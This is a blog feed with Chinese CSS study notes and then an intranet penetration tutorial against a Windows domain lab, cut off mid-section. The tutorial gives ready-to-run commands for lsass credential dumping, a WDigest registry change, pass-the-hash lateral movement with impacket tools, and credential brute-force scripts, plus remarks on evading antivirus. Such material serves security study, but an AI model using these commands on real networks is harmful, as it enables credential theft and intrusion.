#foo;</p><p>单独属性:</p><p>border-widh:</p><p>border-style:</p><pre><code>dotted 点状虚线dashed（虚线）solid（实线）double（双实线）border-color(颜色)</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326173422032.png" alt="image-20220326173422032"></p><h2 id="margin-padding"><a href="#margin-padding" class="headerlink" title="margin padding"></a>margin padding</h2><p>padding:内边距</p><p>值：像素/厘米等长度单位、百分比</p><p>padding:10px; 上下左右</p><p>padding:10px 10px; 上下 左右</p><p>padding:10px 10px 10px; 上 左右 下</p><p>padding:10px 10px 10px 10px; 上 右 下 左（设置4个点–&gt;顺时针方向）</p><p>单独属性</p><p>padding-top:</p><p>padding-right:</p><p>padding-bottom:</p><p>padding-left:</p><p>当设置内边距的时候会把盒子撑大，为了保持盒子原来的大小，应该高度和宽度进行减小，根据width和height减小</p><p>margin 外边距值：与padding相同</p><p> 单独属性：与padding相同 </p><p>外边距合并：两个盒子同时设置了外边距，会进行一个外边距合并 </p><p>margin</p><p>margin:10px 上下左右都会腾出10px出来</p><p>margin:0px auto; 居中</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326175233023.png" alt="image-20220326175233023"></p><p><strong>让div和内容居中</strong></p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326180736898.png" alt="image-20220326180736898"></p><h2 id="float-脱离文档流浮动"><a href="#float-脱离文档流浮动" class="headerlink" title="float 脱离文档流浮动"></a>float 脱离文档流浮动</h2><p>left 元素向左浮动。</p><p>right 元素向右浮动</p><p>清除浮动:</p><pre><code>clear: both;leftright</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326210210962.png" alt="image-20220326210210962"></p><h2 id="块级元素行内元素"><a href="#块级元素行内元素" class="headerlink" title="块级元素行内元素"></a>块级元素行内元素</h2><p><strong>块级元素</strong></p><p>他会独占一行，在默认情况下，其宽度自动填满其父元素的宽度；</p><p>块级元素可以设置width、height属性；</p><p>块级元素即使设置了宽度也是独占一行，块级元素可以设置margin、padding属性</p><p><strong>行内元素</strong></p><p>行内元素不会独占一行，相邻的行内元素会排列在同一行里，直到行排不下，就自动换行，其宽度随内容而变化；</p><p>行内元素的width、height属性则无效；</p><p>行内元素的margin、padding属性很奇怪，水平方向的padding-left、padding-rigtht、margin-left、padding-right都会产生边距效果，但是竖直方向的padding-top、padding-bottom、margin-top、margin-bottom却不产生边距效果。</p><p><strong>块级元素(block element)</strong></p><pre><code>address 地址center 举中对齐块div- 常用块级容易dl 定义列表form 交互表单 （只能用来容纳其它块元素）h标签hr 水平分隔线ol 无需列表ul有序列表p 段落pre 格式化文本</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326211940013.png" alt="image-20220326211940013"></p><p><strong>行内元素转换</strong></p><pre><code>display:none; 不显示display:block;变成块级元素display:inline; 变成行内元素display:inline-block;以块级元素样式展示，以行级元素样式排列</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326212608009.png" alt="image-20220326212608009"></p><p>两个块级元素此时在同一行了</p><p><strong>行内元素溢出处理</strong></p><pre><code>overflow 属性规定当内容溢出元素框时发生的事情：visible    默认值。内容不会被修剪，会呈现在元素框之外。hidden    内容会被修剪，并且其余内容是不可见的。scroll    内容会被修剪，但是浏览器会显示滚动条以便查看其余的内容。auto    如果内容被修剪，则浏览器会显示滚动条以便查看其余的内容。inherit    规定应该从父元素继承 overflow 属性的值。</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326214145022.png" alt="image-20220326214145022"></p><p>我们可以看到此时元素超出的边框</p><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220326214302027.png" alt="image-20220326214302027"></p><p>添加overflow后会增加一个拖动条</p><h2 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h2><pre><code>positionstatic静态定位（不对它的位置进行改变，在哪里就在那里）默认值。没有定位，元素出现在正常的流中（忽略 top,bottom, left, right 或者z-index 声明）。fixed固定定位（参照物--浏览器窗口）---做 弹窗广告用到生成固定定位的元素，相对于浏览器窗口进行定位。 元素的位置通过 &quot;left&quot;, &quot;top&quot;, &quot;right&quot;以及 &quot;bottom&quot;属性进行规定。relative（相对定位 ）（参照物以他本身）生成相对定位的元素，相对于其正常位置进行定位。absolute（绝对定位）(除了static都可以，找到参照物--&gt;与它最近的已经有定位的父元素进行定位)生成绝对定位的元素，相对于 static 定位以外的第一个父元素进行定位。元素的位置通过 &quot;left&quot;, &quot;top&quot;, &quot;right&quot; 以及 &quot;bottom&quot; 属性进行规定z-indexz-index 属性设置元素的堆叠顺序。拥有更高堆叠顺序的元素总是会处于堆叠顺序较低的元素的前面。定位的基本思想: 它允许你定义元素框相对于其正常位置应该出现的位置，或者相对于父元素、另一个元素甚至浏览器窗口本身的位置。</code></pre><p><img src="/2022/03/24/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220327005012845.png" alt="image-20220327005012845"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;简单的HTML页面架构&quot;&gt;&lt;a href=&quot;#简单的HTML页面架构&quot; class=&quot;headerlink&quot; title=&quot;简单的HTML页面架构&quot;&gt;&lt;/a&gt;简单的HTML页面架构&lt;/h1&gt;&lt;pre&gt;&lt;code class=&quot;html&quot;&gt;</summary>
      
    
    
    
    <category term="语言" scheme="https://sakurahack-y.github.io/categories/%E8%AF%AD%E8%A8%80/"/>
    
    <category term="html" scheme="https://sakurahack-y.github.io/categories/%E8%AF%AD%E8%A8%80/html/"/>
    
    
    <category term="html" scheme="https://sakurahack-y.github.io/tags/html/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透篇</title>
    <link href="https://sakurahack-y.github.io/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/"/>
    <id>https://sakurahack-y.github.io/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/</id>
    <published>2022-03-18T06:56:01.000Z</published>
    <updated>2022-03-31T16:30:08.477Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="域的搭建"><a href="#域的搭建" class="headerlink" title="域的搭建"></a>域的搭建</h1><p>实验环境:</p><p>win2008 域控       本地管理员密码:0801.com  域密码:yk2008.com    ip:192.168.137.2     </p><p>win 2008 域成员  本地管理员密码:0802.com  域密码:yc2008.com    ip:192.168.137.66</p><p>win 2003 域成员  本地管理员密码:0301.com  域密码: yc2003.com    ip:192.168.137.99</p><p><strong>配置域控2008</strong></p><p>使用vm1网卡</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322141739390.png" alt="image-20220322141739390"></p><p>配置ip</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322141649714.png" alt="image-20220322141649714"></p><p>找到服务器管理器</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322135655066.png" alt="image-20220322135655066"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322135624657.png" alt="image-20220322135624657"></p><p>一直下一步，然后安装</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322140010325.png" alt="image-20220322140010325"></p><p>安装成功</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322140057795.png" alt="image-20220322140057795"></p><p>运行dcpromo程序:</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322141947512.png" alt="image-20220322141947512"></p><p>一直下一步，到这里新建域</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322142110877.png" alt="image-20220322142110877"></p><p>命名林根域</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322142158498.png" alt="image-20220322142158498"></p><p>选择2008 R2</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322142302851.png" alt="image-20220322142302851"></p><p>一直下一步/默认是，到这一步设置密码为:yk2008.com</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322142632261.png" alt="image-20220322142632261"></p><p>一直下一步</p><p>完成了域控的配置，并重启</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322142812609.png" alt="image-20220322142812609"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322142833978.png" alt="image-20220322142833978"></p><p>重启后，有域的标识出现，我们使用前文设置的域控密码登录</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322143248873.png" alt="image-20220322143248873"></p><p>进入后</p><p>打开域管理中心</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322150310596.png" alt="image-20220322150310596"></p><p>打开用户和计算机，新建组织hack</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322151545759.png" alt="image-20220322151545759"></p><p>在这个组分别建立server2003用户和server2008用户，设置域密码分别为 yc2003.com和yc2008.com</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322151809690.png" alt="image-20220322151809690"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322151918916.png" alt="image-20220322151918916"></p><p>到这里域控的配置就完成了，接下来就让域成员加入域</p><p>进入windows2003</p><p>更改计算机名加入域</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322153432998.png" alt="image-20220322153432998"></p><p>windows2008同理</p><p>然后重启</p><p>输入加入域的计算机名</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322154303764.png" alt="image-20220322154303764"></p><p>成功登入</p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322154329618.png" alt="image-20220322154329618" style="zoom:50%;"><p>我们在域控中就能看到两台计算机上线</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322154709810.png" alt="image-20220322154709810"></p><p>域环境就搭建好了</p><h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p><strong>基本信息收集：</strong></p><p>了解当前服务器的计算机基本信息，为后续判断服务器角色，网络环境等做准备</p><pre><code>systeminfo 详细信息net start 启动服务tasklist 进程列表schtasks 计划任务</code></pre><p><strong>网络信息收集:</strong></p><p>了解当前服务器的网络接口信息，为判断当前角色，功能，网络架构做准备</p><pre><code>ipconfig /all 判断存在域-dnsnet view /domain 判断存在域net time /domain 判断主域netstat -ano 当前网络端口开放nslookup 域名 追踪来源地址</code></pre><p><strong>用户信息收集:</strong></p><p>了解当前计算机或域环境下的用户及用户组信息，便于后期利用凭据进行测试</p><pre><code>Domain Admins：域管理员（默认对域控制器有完全控制权）Domain Computers：域内机器Domain Controllers：域控制器Domain Guest：域访客，权限低Domain Users：域用户Enterprise Admins：企业系统管理员用户（默认对域控制器有完全控制权）相关用户收集操作命令：whoami /all 用户权限net config workstation 登录信息net user 本地用户net localgroup 本地用户组net user /domain 获取域用户信息net group /domain 获取域用户组信息wmic useraccount get /all 涉及域用户详细信息net group &quot;Domain Admins&quot; /domain 查询域管理员账户net group &quot;Enterprise Admins&quot; /domain 查询管理员用户组net group &quot;Domain Controllers&quot; /domain 查询域控制器</code></pre><p><strong>凭据信息收集操作:</strong></p><p>收集各种密文，明文，口令等，为后续横向渗透做好测试准备</p><pre><code>计算机用户 HASH，明文获取-mimikatz(win)，mimipenguin(linux)计算机各种协议服务口令获取-LaZagne(all)，XenArmor(win)Netsh WLAN show profilesNetsh WLAN show profile name=&quot;无线名称&quot; key=clear1.站点源码备份文件、数据库备份文件等2.各类数据库 Web 管理入口，如 PHPMyAdmin3.浏览器保存密码、浏览器 Cookies4.其他用户会话、3389 和 ipc$连接记录、回收站内容5.Windows 保存的 WIFI 密码6.网络内部的各种帐号和密码，如：Email、VPN、FTP、OA 等</code></pre><p><strong>探针主机域控架构服务:</strong></p><p>为后续横向思路做准备，针对应用，协议等各类攻击手法</p><pre><code>探针域控制器名及地址信息net time /domain nslookup ping探针域内存活主机及地址信息nbtscan 192.168.3.0/24 第三方工具for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr &quot;TTL=&quot; 自带内部命令nmap masscan 第三方 PowerShell 脚本 nishang empire 等#导入模块 nishangImport-Module .\nishang.psm1#设置执行策略Set-ExecutionPolicy RemoteSigned#获取模块 nishang 的命令函数Get-Command -Module nishang#获取常规计算机信息Get-Information#端口扫描（查看目录对应文件有演示语法，其他同理）Invoke-PortScan -StartAddress 192.168.3.0 -EndAddress 192.168.3.100 -ResolveHost -ScanPort#其他功能：删除补丁，反弹 Shell，凭据获取等探针域内主机角色及服务信息利用开放端口服务及计算机名判断核心业务机器:1.高级管理人员、系统管理员、财务/人事/业务人员的个人计算机2.产品管理系统服务器3.办公系统服务器4.财务应用系统服务器5.核心产品源码服务器（自建 SVN、GIT）6.数据库服务器7.文件或网盘服务器、共享服务器8.电子邮件服务器9.网络监控系统服务器10.其他服务器（内部技术文档服务器、其他监控服务器等）</code></pre><h1 id="域横向"><a href="#域横向" class="headerlink" title="域横向"></a>域横向</h1><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/1b22fbb60e7aa3f167c08e67c61e025e73769fd3.png@942w_611h_progressive.webp" alt="img"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320150741924.png" alt="image-20220320150741924"></p><h2 id="域横向必备知识点"><a href="#域横向必备知识点" class="headerlink" title="域横向必备知识点"></a><strong>域横向必备知识点</strong></h2><p><strong>知识点1：</strong><br>Windows2012以上版本默认关闭wdigest,攻击者无法从内存中获取明文密码<br>Windows2012以下版本如安装KB2871997补丁，同样也会导致无法获取明文密码</p><pre><code>针对以上情况，我们提供了4种方式解决此类问题1.利用哈希 hash 传递(pth，ptk等)进行移动2.利用其它服务协议(SMB,WMI等)进行哈希移动3.利用注册表操作开启Wdigest Auth值进行获取4.利用工具或第三方平台(Hachcat)进行破解获取</code></pre><pre><code>#注册表操作开启Wdigest Auth值reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</code></pre><p><strong>知识点2：</strong><br>Windows系统LM Hash及NTLM Hash加密算法，个人系统在Windows vista后，服务器系统在Windows 2003以后，认证方式均为NTLM Hash。</p><pre><code>#获取win密码hash的两个工具Pwdump7QuarksPwdump</code></pre><p><strong>知识点3：</strong><br>域用户与本地用户的区别<br>比如，<code>god/administrator</code>是域用户，<code>./administrator</code>是本地用户</p><h2 id="at-amp-amp-schtasks-密码是明文"><a href="#at-amp-amp-schtasks-密码是明文" class="headerlink" title="at&amp;&amp;schtasks(密码是明文)"></a><strong>at&amp;&amp;schtasks(密码是明文)</strong></h2><p><strong>优点:官方自带命令，不会被杀</strong></p><p><strong>缺点:命令比较繁琐，且只支持明文密码</strong></p><p>在拿下一台内网主机后，通过本地信息搜集收集用户凭证等信息后，如何横向渗透拿下更多的主机？ 这里介绍 at&amp;schtasks 命令的使用，在已知目标系统的用户明文密码的基础上，直接可以在远程主 机上执行命令</p><p>获取到某域主机权限–&gt;minikatz 得到密码（明文，hash）–&gt;用到信息收集里面域用户的列表当做用户名字典-&gt;用到密码明文当做密码字典–&gt;尝试连接–&gt;创建计划任务(at|schtasks)–&gt;执行文件可为后门或者相关命令</p><p>利用流程:</p><ol><li>建立 IPC 链接到目标主机 (目标主机要开启135，445)</li><li> 拷贝要执行的命令脚本到目标主机 </li><li>查看目标时间，创建计划任务（at、schtasks）定时执行拷贝到的脚本 </li><li> 删除 IPC 链接 </li></ol><pre><code>net use \\server\ipc$&quot;password&quot; /user:username # 工作组 net use \\server\ipc$&quot;password&quot; /user:domain\username #域内 dir \\xx.xx.xx.xx\C$\ # 查看文件列表 copy \\xx.xx.xx.xx\C$\1.bat 1.bat # 下载文件 copy 1.bat \\xx.xx.xx.xx\C$ # 复制文件 net use \\xx.xx.xx.xx\C$\1.bat /del # 删除 IPC net view xx.xx.xx.xx # 查看对方共享 #建立 IPC 常见的错误代码 （1）5：拒绝访问，可能是使用的用户不是管理员权限，需要先提升权限 （2）51：网络问题，Windows 无法找到网络路径 （3）53：找不到网络路径，可能是 IP 地址错误、目标未开机、目标 Lanmanserver 服务未启动、有 防火墙等问题 （4）67：找不到网络名，本地 Lanmanworkstation 服务未启动，目标删除 ipc$ （5）1219：提供的凭据和已存在的凭据集冲突，说明已建立 IPC$，需要先删除 （6）1326：账号密码错误 （7）1792：目标 NetLogon 服务未启动，连接域控常常会出现此情况 （8）2242：用户密码过期，目标有账号策略，强制定期更改密码 #建立 IPC 失败的原因 （1）目标系统不是 NT 或以上的操作系统 （2）对方没有打开 IPC$共享 （3）对方未开启 139、445 端口，或者被防火墙屏蔽 （4）输出命令、账号密码有错误</code></pre><pre><code>[at] &amp; [schtasks]#at &lt; Windows2012net use \\192.168.3.21\ipc$ &quot;Admin12345&quot; /user:god.org\administrator # 建立 ipc 连接：copy add.bat \\192.168.3.21\c$ #拷贝执行文件到目标机器at \\192.168.3.21 15:47 c:\add.bat #添加计划任务#schtasks &gt;=Windows2012net use \\192.168.3.32\ipc$ &quot;admin!@#45&quot; /user:god.org\administrator # 建立 ipc 连接：copy add.bat \\192.168.3.32\c$ #复制文件到其 C 盘schtasks /create /s 192.168.3.32 /ru &quot;SYSTEM&quot; /tn adduser /sc DAILY /tr c:\add.bat /F #创建 adduser 任务对应执行文件schtasks /run /s 192.168.3.32 /tn adduser /i #运行 adduser 任务schtasks /delete /s 192.168.3.21 /tn adduser /f#删除 adduser 任务</code></pre><h2 id="atexec-impacket-明文和HASH-传递攻击"><a href="#atexec-impacket-明文和HASH-传递攻击" class="headerlink" title="atexec-impacket 明文和HASH 传递攻击"></a><strong>atexec-impacket 明文和HASH 传递攻击</strong></h2><p><strong>impacket的exe版本:<a href="https://github.com/maaaaz/impacket-examples-windows">https://github.com/maaaaz/impacket-examples-windows</a></strong></p><p><strong>优点:命令简单，易上手</strong></p><p><strong>缺点:非官方自带，可能被杀</strong></p><pre><code>atexec.exe ./administrator:Admin12345@192.168.3.21 &quot;whoami&quot;atexec.exe god/administrator:Admin12345@192.168.3.21 &quot;whoami&quot;atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@192.168.3.21 &quot;whoami&quot;</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320153845240.png" alt="image-20220320153845240"></p><p><strong>明文 HASH 传递批量利用</strong></p><p>收集活跃ip，放在ip.txt中</p><pre><code>FOR /F %%i in (ips.txt) do net use \\%%i\ipc$ &quot;admin!@#45&quot; /user:administrator #批量检测 IP 对应明文连接FOR /F %%i in (ips.txt) do atexec.exe ./administrator:admin!@#45@%%i whoami #批量检测 IP 对应明文回显版</code></pre><p>收集可能的密码和hash放在文件中</p><pre><code>FOR /F %%i in (pass.txt) do atexec.exe ./administrator:%%i@192.168.3.21 whoami #批量检测明文对应 IP回显版FOR /F %%i in (hash.txt) do atexec.exe -hashes :%%i ./administrator@192.168.3.21 whoami #批量检测 HASH 对应 IP 回显版</code></pre><p><strong>明文HASH传递批量利用-升级版</strong></p><p>利用py脚本制作的exe文件批量尝试横向渗透</p><p>Fuck.py</p><pre><code class="python">import osimport timeips=&#123;    &#39;192.168.3.30&#39;,    &#39;192.168.3.25&#39;,    &#39;192.168.3.32&#39;,    &#39;192.168.3.29&#39;&#125;users=&#123;    &#39;admin&#39;,    &#39;user&#39;,    &#39;Administrator&#39;,    &#39;webadmin&#39;,    &#39;boss&#39;&#125;passwds=&#123;    &#39;123456&#39;,    &#39;passwd&#39;,    &#39;admin123&#39;    &#39;admin666&#39;&#125;for ip in ips:    for user in users:        for passwd in passwds:            exec = &quot;net use \\&quot;+ &quot;\\&quot; + ip +&#39;ipc$ &#39;+passwd+&#39; /user:god\\&#39; + user            print(&#39;----&gt;&#39;+exec+&#39;&lt;----&#39;)            os.system(exec)            time.sleep(1)</code></pre><p>执行效果</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320161721565.png" alt="image-20220320161721565"></p><p>将python脚本编译成exe文件</p><p>安装pyinstaller</p><pre><code>pip install pyinstaller</code></pre><p>生成可执行EXE</p><pre><code>Pyinstaller -F [.py文件]</code></pre><p>会生成一个同名的exe文件 </p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320162043000.png" alt="image-20220320162043000"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320162242560.png" alt="image-20220320162242560"></p><h2 id="Procdump-Mimikatz-配合获取hash密码"><a href="#Procdump-Mimikatz-配合获取hash密码" class="headerlink" title="Procdump+Mimikatz 配合获取hash密码"></a><strong>Procdump+Mimikatz 配合获取hash密码</strong></h2><p>这种情况适用于mimikatz被杀，但是自己做免杀失败/或不想做免杀可以来与Procdump配合使用，因为Procdump是官方自带的，所以不会被杀</p><ul><li>Procdump下载：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</a></li><li>mimikatz下载：<a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></li></ul><pre><code># procdump 在目标机上执行procdump -accepteula -ma lsass.exe lsass.dmp# mimikatz 在本地执行：privilege::debugesekurlsa::minidump lsass.dmpsekurlsa::logonPasswords full</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320165205243.png" alt="image-20220320165205243"></p><p>然后可以利用 Hashcat 破解获取 Windows NTML Hash</p><h2 id="SMB-服务利用-psexec-官方自带-第三方-smbexec-只有第三方"><a href="#SMB-服务利用-psexec-官方自带-第三方-smbexec-只有第三方" class="headerlink" title="SMB 服务利用-psexec(官方自带+第三方),smbexec(只有第三方)"></a><strong>SMB 服务利用-psexec(官方自带+第三方),smbexec(只有第三方)</strong></h2><p><strong>psexec</strong></p><p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools">PsTools - Windows Sysinternals | Microsoft Docs</a></p><p>利用 SMB 服务可以通过明文或 hash 传递来远程执行，条件 445 服务端口开放。</p><pre><code>#psexec 第一种：先有 ipc 链接，psexec 需要明文或 hash 传递net use \\192.168.3.32\ipc$ &quot;admin!@#45&quot; /user:administratorpsexec \\192.168.3.32 -s cmd # 需要先有 ipc 链接 -s 以 System 权限运行exit #退出</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320171306833.png" alt="image-20220320171306833"></p><pre><code>#psexec 第二种：不用建立 IPC 直接提供明文账户密码psexec \\192.168.3.21 -u administrator -p Admin12345 -s cmd</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320172223595.png" alt="image-20220320172223595"></p><p>但是当我们使用hash传递时</p><pre><code>psexec -hashes :$HASH$ ./administrator@10.1.2.3psexec -hashes :$HASH$ domain/administrator@10.1.2.3psexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 官方 Pstools 无法采用 hash 连接#非官方自带-参考 impacket 工具包使用，操作简单，容易被杀</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320172705914.png" alt="image-20220320172705914"></p><p>就会出现问题，这是因为官方 Pstools 无法采用 hash 连接，所以我们可以使用 impacket 工具包</p><p>缺点:非官方，会被杀毒软件杀掉，所以要做免杀</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320173053675.png" alt="image-20220320173053675"></p><p><strong>smbexec</strong></p><p>无需先 ipc 链接 明文或 hash 传递</p><pre><code>smbexec god/administrator:Admin12345@192.168.3.21smbexec ./administrator:admin!@#45@192.168.3.32smbexec -hashes :$HASH$ ./admin@192.168.3.21smbbexec -hashes :$HASH$ domain/admin@192.168.3.21smbexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32smbexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320173615976.png" alt="image-20220320173615976"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320173738115.png" alt="image-20220320173738115"></p><h2 id="WMI-服务利用-wmic-cscript-wmiexec"><a href="#WMI-服务利用-wmic-cscript-wmiexec" class="headerlink" title="WMI 服务利用-wmic,cscript,wmiexec"></a><strong>WMI 服务利用-wmic,cscript,wmiexec</strong></h2><p>WMI(Windows Management Instrumentation) 是通过 135 端口进行利用，支持用户名明文或者 hash 的方式进行认证，并且该方法不会在目标日志系统留下痕迹。</p><p><strong>自带 WMIC 明文传递 无回显 所以写入文件夹后还要自己想办法读取</strong></p><pre><code>wmic /node:192.168.3.21 /user:administrator /password:Admin12345 process call create &quot;cmd.exe /c ipconfig &gt;C:\1.txt&quot;    </code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320180441580.png" alt="image-20220320180441580"></p><p><strong>自带 cscript 明文传递 有回显</strong></p><pre><code>cscript //nologo wmiexec.vbs /shell 192.168.3.21 administrator Admin12345#escript不需要下载，自带。但是需要用到第三方 wmiexec.vbs，但是wmiexec.vbs免杀非常简单</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320180646769.png" alt="image-20220320180646769"></p><p>套件 impacket wmiexec 明文或 hash 传递 有回显 exe 版本</p><pre><code>wmiexec ./administrator:admin!@#45@192.168.3.32 &quot;whoami&quot;wmiexec god/administrator:Admin12345@192.168.3.21 &quot;whoami&quot;wmiexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 &quot;whoami&quot;wmiexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21 &quot;whoami&quot;</code></pre><p>缺点：容易被杀</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320181811547.png" alt="image-20220320181811547"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320181844775.png" alt="image-20220320181844775"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320182207418.png" alt="image-20220320182207418"></p><p>同理可以借用编程解放双手</p><p><strong>hash 批量利用-python 编译 exe</strong></p><pre><code class="python">#pyinstaller.exe -F fuck_neiwang_002.pyimport os,timeips=&#123;&#39;192.168.3.21&#39;,&#39;192.168.3.25&#39;,&#39;192.168.3.29&#39;,&#39;192.168.3.30&#39;,&#39;192.168.3.32&#39;&#125;users=&#123;&#39;Administrator&#39;,&#39;boss&#39;,&#39;dbadmin&#39;,&#39;fileadmin&#39;,&#39;mack&#39;,&#39;mary&#39;,&#39;webadmin&#39;&#125;hashs=&#123;&#39;ccef208c6485269c20db2cad21734fe7&#39;,&#39;518b98ad4178a53695dc997aa02d455c&#39;&#125;for ip in ips:for user in users:for mimahash in hashs:#wmiexec -hashes :hashgod/user@ipwhoamiexec = &quot;wmiexec -hashes :&quot;+mimahash+&quot; god/&quot;+user+&quot;@&quot;+ip+&quot; whoami&quot;print(&#39;---&gt;&#39; + exec + &#39;&lt;---&#39;)os.system(exec)time.sleep(0.5)</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320183203790.png" alt="image-20220320183203790"></p><h2 id="PTH-amp-PTK-amp-PTT哈希票据传递"><a href="#PTH-amp-PTK-amp-PTT哈希票据传递" class="headerlink" title="PTH&amp;PTK&amp;PTT哈希票据传递"></a><strong>PTH&amp;PTK&amp;PTT哈希票据传递</strong></h2><p><img 